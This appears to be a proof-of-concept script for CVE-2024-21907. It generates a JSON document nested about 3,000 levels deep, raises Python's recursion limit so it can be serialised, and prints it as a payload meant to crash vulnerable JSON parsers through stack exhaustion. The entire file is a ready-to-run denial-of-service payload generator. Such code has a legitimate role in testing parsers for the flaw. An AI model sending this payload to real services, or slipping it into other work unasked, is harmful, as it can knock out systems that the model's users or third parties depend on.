import json
import sys

# CVE-2024-21907
# https://github.com/advisories/GHSA-5crp-9r3c-p9vr
def generate_nested_json(depth):
    nested_json = {}
    current_level = nested_json

    for i in range(depth):
        current_level['a'] = {}
        current_level = current_level['a']

    return json.dumps(nested_json)

# Recursion Limit Check
print("Recursion Limit is set at " + str(sys.getrecursionlimit()))
# Setting Recursion Limit to 3k
n=3000
sys.setrecursionlimit(n)

# Example usage
depth = 2967 #Note issues with recursion limits: https://stackoverflow.com/questions/29029745/maximum-recursion-depth-exceeded-in-json-tree
nested_json_payload = generate_nested_json(depth)
print(nested_json_payload)
